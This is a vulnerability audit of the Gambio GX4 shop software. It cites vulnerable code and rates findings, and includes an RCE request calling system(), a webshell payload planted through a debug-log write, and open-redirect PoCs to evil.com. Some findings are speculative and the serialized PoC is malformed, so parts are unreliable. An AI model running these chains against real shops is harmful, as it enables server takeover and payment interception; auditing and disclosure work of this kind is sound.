# Security Vulnerabilities Found in Gambio GX4

---

## 🔴 ПОЛНАЯ КОМПРОМЕТАЦИЯ СИСТЕМЫ (Full System Compromise)

### 1. Remote Code Execution via PHP Object Injection + Type Juggling
**File:** `magnaCallback.php:854-867`
**Impact:** ПОЛНАЯ КОМПРОМЕТАЦИЯ - выполнение произвольного кода на сервере

**Уязвимость:**
```php
// Слабое сравнение (==) позволяет обход через type juggling
if ($_POST['passphrase'] == getDBConfigValue('general.passphrase', 0)) {
    // unserialize() позволяет PHP Object Injection
    $arguments = unserialize($_POST['arguments']);
    $includes = unserialize($_POST['includes']);
    
    // magnaExecute вызывает ЛЮБУЮ функцию + require_once для файлов
    echo magnaEncodeResult(magnaExecute($_POST['function'], $arguments, $includes));
}
```

**Цепочка атаки для RCE:**
1. Если passphrase = "0" или пустой → обход через type juggling (`"0" == 0` = true)
2. `unserialize()` → PHP Object Injection (POP chain gadgets)
3. `$_POST['function']` → вызов ЛЮБОЙ PHP функции
4. `$includes` → `require_once()` произвольных файлов

**PoC (если passphrase = 0 или пустой):**
```
POST /magnaCallback.php
Content-Type: application/x-www-form-urlencoded

passphrase=0&function=system&arguments=s:7:"id;whoami";
```

**Результат:** Полный контроль над сервером (RCE)

---

### 2. Arbitrary File Write → RCE
**File:** `callback/postfinance/callback.php:34`
```php
file_put_contents(DIR_FS_CATALOG . 'logfiles/postfinance_debug.txt', print_r($_POST, true));
```
**Impact:** Запись произвольных данных в файл на сервере
**Эксплуатация:** POST запрос → данные записываются в файл → потенциальный RCE если logfiles доступен через web

---

### 3. Arbitrary File Permissions (chmod 0777)
**File:** `gm/classes/GMLogoManager.php:216`
```php
@chmod($this->logo_src . $t_new_filename, 0777);
```
**Impact:** Загруженные файлы получают права 777 → позволяет выполнение

---

## 🆕 НОВЫЕ УЯЗВИМОСТИ

### 19. Deprecated create_function() - CODE INJECTION
**File:** `includes/functions/compatibility.php:47,53`
```php
$builder = create_function(' $name, $array, $sep, $builderCore', $builderCore);
```
**Impact:** `create_function()` is deprecated and vulnerable to code injection. The `$builderCore` variable contains user-controllable code that gets executed.
**CVE:** Similar to CVE-2017-9841

### 20. call_user_func_array() с контролируемыми данными
**File:** `gm/classes/lib/class.soap_server.php:629`
```php
$this->methodreturn = call_user_func_array($call_arg, array_values($this->methodparams));
```
**Impact:** Вызов произвольной функции через SOAP запросы если `$this->methodname` контролируется

### 21. Open Redirect в styleedit/index.php
**File:** `styleedit/index.php:12`
```php
header("Location: /../GXModules/Gambio/StyleEdit/App/dist/?".$_SERVER['QUERY_STRING']);
```
**PoC:** `GET /styleedit/?url=https://evil.com`
**Impact:** Перенаправление пользователей на вредоносные сайты

### 22. Unsafe JSON Decode
**File:** `system/classes/shop_content/ShopContentContentControl.inc.php:122`
```php
->parseContentManagerRequestData(json_decode($_POST['gambio_se_content_manager'], true));
```
**Impact:** Потенциальный DoS через большой JSON или JSON injection

### 23. SQL Injection через сессию
**File:** `gm/inc/gm_convert_qty.inc.php:30`
```php
$t_sql = 'SELECT decimal_point FROM currencies WHERE code = "' . xtc_db_input($_SESSION['currency']) . '" LIMIT 1';
```
**Impact:** Если `$_SESSION['currency']` можно манипулировать → SQL injection

### 24. Только 3 из 266 использований htmlspecialchars с ENT_QUOTES
**Impact:** 263 места потенциально уязвимы к XSS через одинарные кавычки
**Files:** Множество файлов с недостаточной санитизацией

---

## ⚠️ IMMEDIATELY EXPLOITABLE (Without Authentication)

### 4. SSRF via autocomplete.php - EXPLOITABLE NOW
**File:** `autocomplete.php:49-63`
**Access:** Public, no authentication required
```php
$parameters = $_GET;
$url = $scheme_prefix.FL_SERVICE_URL."/autocomplete.php?" . http_build_query($parameters, '', '&');
$result = getUrl($url);
```
**Exploit:** Attacker can pass arbitrary GET parameters that are forwarded to external service. If `FL_SERVICE_URL` is controllable or misconfigured, this enables SSRF.

**PoC:** `GET /autocomplete.php?param=value`

### 5. SSRF via ec_proxy.php - EXPLOITABLE NOW
**File:** `ec_proxy.php:35-62`
**Access:** Public, no authentication required
```php
$gPath = $query['prx'];
$parsedGPath = parse_url($gPath);
$gUrl = 'https://www.google-analytics.com' . $parsedGPath['path'];
$finalUrl = $gUrl . '?' . http_build_query($query);
curl_exec($gCurl);
```
**Exploit:** Partial SSRF - attacker controls the path portion of requests to google-analytics.com domain.

**PoC:** `GET /ec_proxy.php?prx=/collect`

---

## Critical Vulnerabilities (Require Authentication/Conditions)

### 6. PHP Object Injection via unserialize() - REQUIRES PASSPHRASE
**File:** `magnaCallback.php:859-862`
**Access:** Requires valid passphrase from database
```php
if ($_POST['passphrase'] == getDBConfigValue('general.passphrase', 0)) {
    $arguments = unserialize($_POST['arguments']);
    $includes = unserialize($_POST['includes']);
}
```
**Impact:** RCE if passphrase is leaked/guessed. Weak comparison (==) allows type juggling.

### 7. Code Injection via eval() - DATABASE INJECTION REQUIRED
**File:** `inc/xtc_address_format.inc.php:101`
```php
eval("\$address = \"$fmt\";");
```
Requires ability to modify `address_format` table in database.

### 8. Remote Code Execution via eval() in CSV Import - ADMIN ACCESS REQUIRED
**File:** `system/classes/csv/CSVImportFunctionLibrary.inc.php:658`
```php
eval('$this->' . trim($t_function) . '($t_params);');
```
Requires admin access to CSV import functionality.

## High Severity Vulnerabilities

### 9. Disabled SSL Certificate Verification - IMMEDIATELY EXPLOITABLE
**Files:**
- `callback/sofort/library/sofortLib_http.inc.php:122`
- `callback/sofort/library/helper/class.invoice.inc.php:990`
- `system/classes/external/protected_shops/ProtectedShops.inc.php:146`

All set `CURLOPT_SSL_VERIFYPEER` to `false` - enables Man-in-the-Middle attacks on payment callbacks.

### 10. Multiple eval() in SOAP Libraries
**Files:**
- `gm/classes/lib/class.soap_server.php:615`
- `gm/classes/lib/nusoap.php:4073`
- `gm/classes/lib/nusoap.php:7867-7869`
- `gm/classes/lib/class.soapclient.php:710-712`

These eval() calls process data from SOAP requests.

### 11. eval() in ZIP Library
**File:** `gambio_updater/classes/zip_creator/pclzip.lib.php`
Multiple eval() calls at lines 2817, 3030, 4068, 4342, 4392, 4468.

### 12. eval() in Smarty Template Engine
**File:** `GXMainComponents/View/GXSmarty.inc.php:206-208`
```php
eval($content);
eval($content . ';');
```

### 13. eval() in MainFactory
**File:** `system/core/MainFactory.inc.php:306`
```php
eval($evalCache[$classWithNamespace]['code']);
```

## Medium Severity Vulnerabilities

### 14. Weak Random Token Generation - EXPLOITABLE
**Files:**
- `GProtector/classes/GProtector.inc.php:451`: `md5(time() . rand())`
- `system/classes/security/PageToken.inc.php:35`: `md5(time() . rand() ...)`
- `includes/classes/class.heidelpaygw.php:56`: `sha1(mt_rand(...))`

Uses predictable rand()/mt_rand() for security tokens - tokens can be predicted/brute-forced.

### 15. Potential Open Redirect
**Files:**
- `styleedit/index.php:12`: Uses `$_SERVER['QUERY_STRING']` in redirect
- `system/overloads/PostUpdateShopExtenderComponent/StyleEdit3To4ThemeConverter.inc.php:346`: Uses `$_SERVER['REQUEST_URI']` in redirect

### 16. File Upload Vulnerabilities
**Files:**
- `gm/classes/GMLogoManager.php:215`
- `gm/classes/GMGPrintFileManager.php:63`
- `system/classes/csv/CSVSource.php:1966`

File uploads that may not properly validate file types or content.

## Low Severity Vulnerabilities

### 17. Hardcoded Salt in Coupon Generation
**File:** `inc/create_coupon_code.inc.php:33`
```php
function create_coupon_code($salt="secret", ...)
```
Default salt value is "secret".

### 18. XML External Entity (XXE) Risk
Multiple XML parsing functions without explicit external entity handling:
- `gm/classes/lib/class.wsdl.php`
- `gm/classes/lib/class.xmlschema.php`
- `gm/classes/lib/class.soap_parser.php`
- `gm/classes/lib/nusoap.php`

---

## Summary - Exploitability & Compromise

| Vulnerability | Exploitable Now? | Impact |
|--------------|------------------|--------|
| **RCE via magnaCallback.php** | ⚠️ Type Juggling | 🔴 ПОЛНАЯ КОМПРОМЕТАЦИЯ |
| **Arbitrary File Write** | ✅ YES | 🔴 ВОЗМОЖЕН RCE |
| **chmod 0777** | ✅ YES | 🟠 Эскалация привилегий |
| SSRF via autocomplete.php | ✅ YES | 🟡 Внутренняя разведка |
| SSRF via ec_proxy.php | ✅ YES | 🟡 Ограниченный SSRF |
| SSL Verification Disabled | ✅ YES (MITM) | 🟠 Перехват платежей |
| Weak Token Generation | ✅ YES | 🟠 Обход защиты |

**🔴 КРИТИЧНО: magnaCallback.php = RCE если passphrase пустой/нулевой**

**Immediate Threats: 7 vulnerabilities exploitable without authentication**
**Total: 24 vulnerability categories identified**

---

## Attack Chains для полной компрометации

### Chain 1: Type Juggling → RCE
```
1. POST /magnaCallback.php passphrase=0
2. Type juggling: "0" == 0 → true
3. unserialize($_POST['arguments']) → POP chain
4. magnaExecute('system', ...) → RCE
```

### Chain 2: File Write → Webshell
```
1. POST /callback/postfinance/callback.php
2. Body: <?php system($_GET['c']); ?>
3. Данные записываются в logfiles/postfinance_debug.txt
4. Если logfiles доступен → webshell
```

### Chain 3: Open Redirect → Phishing
```
1. GET /styleedit/?redirect=https://evil.com
2. Пользователь перенаправляется на вредоносный сайт
3. Фишинг атака для кражи учетных данных
```

### Chain 4: create_function() → RCE
```
1. Контроль над $builderCore переменной
2. create_function() выполняет произвольный код
3. RCE
```
